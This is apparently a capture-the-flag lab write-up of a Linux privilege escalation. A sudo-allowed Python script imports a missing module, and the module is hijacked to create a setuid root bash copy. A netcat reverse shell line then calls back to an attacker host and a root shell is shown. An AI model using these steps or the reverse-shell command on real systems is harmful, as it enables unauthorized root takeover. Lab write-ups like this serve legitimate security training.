# 6 privesc

```
# sudo -l shows
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
	
www-data@walla:/home/walter$ cat wifi_reset.py
#!/usr/bin/python

import sys

try:
        import wificontroller
except Exception:
        print "[!] ERROR: Unable to load wificontroller module."
        sys.exit()

wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificotroller.start("wlan0", "1")

# hijaking wificontroller.py
# as it does not exist

$ cat << kashz > wificontroller.py
import os;
os.system("cp /usr/bin/bash /tmp/kashz");
os.system("chmod +s /tmp/kashz");
print("COMPLETE!");
kashz

www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
COMPLETE!

www-data@walla:/home/walter$ /tmp/kashz -p
kashz-5.0# whoami
root
kashz-5.0# whoami;id
root
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

# to get proper shell, we can shell via RCE
# add line to wificontroller.py | os.system("/usr/bin/nc -e /bin/bash 192.168.49.197 80");

$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.197] from (UNKNOWN) [192.168.197.97] 36940
whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

```
```
